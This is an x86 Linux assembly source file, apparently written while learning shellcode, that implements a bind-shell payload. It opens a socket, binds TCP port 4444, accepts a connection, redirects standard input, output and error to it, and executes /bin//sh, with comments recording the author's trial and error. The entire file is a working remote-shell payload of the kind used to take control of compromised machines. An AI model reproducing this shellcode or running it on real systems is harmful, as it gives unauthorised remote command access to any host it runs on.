; Syscalls - cat /usr/include/i386-linux-gnu/asm/unistd_32.h
; Call numbers for socketcall -- /usr/include/linux/net.h

global _start

section .text
_start:

sock:
	; creating a socket syscall

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov bl, 0x1

	push ecx
	push ebx
	push 0x2
	mov ecx, esp

	mov al, 0x66
	int 0x80

	mov esi, eax ; Saving socket for further use

	; creating a bind function

	; bind(socket_d, (struct sockaddr*) &sockstruct, sizeof(sockstruct))

	mov al, 0x66

	; creating a sockaddr structure

	xor ebx, ebx
	; Not pushing word, need to check if the shell runs or not. Doesn't work, gives a seg fault. Prolly cuz push inly takes 32 bit reg i.e. a DWORD

	push ebx
	push word 0x5c11
	push word 0x2

	mov ecx, esp

	push 0x10 ; Size of sockstruct
	push ecx ; Sockstruct from stack
	push esi ; Earlier saved socket

	mov ecx, esp

	mov bl, 0x2
	int 0x80

	; Listen to incoming connections

	mov al, 0x66 ; Syscall - socketcall

	; arguments to listen function

	xor ebx, ebx
	push ebx
	push esi

	mov ecx, esp

	mov bl, 0x4  ; Call number 4 for listen
	int 0x80

	; accepting incoming connections

	mov al, 0x66

	; arguments to accept function

	xor ebx, ebx
	push ebx ; try pushing only bl. Tried, gives an error while building -> invalid operation between operand and operator
	push ebx ; try pushing only bl
	push esi
	mov ecx, esp

	mov bl, 0x5
	int 0x80

	; piping output to our socket

	mov ebx, eax
	mov ecx, 0x2

pipe:

	mov al, 0x3f
	int 0x80
	dec ecx
	jns pipe ; try jnz. Tried. Doesn't work, figure out y

	; execve syscall

	xor ecx, ecx
	mov edx, ecx

	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp

	mov al, 0xb
	int 0x80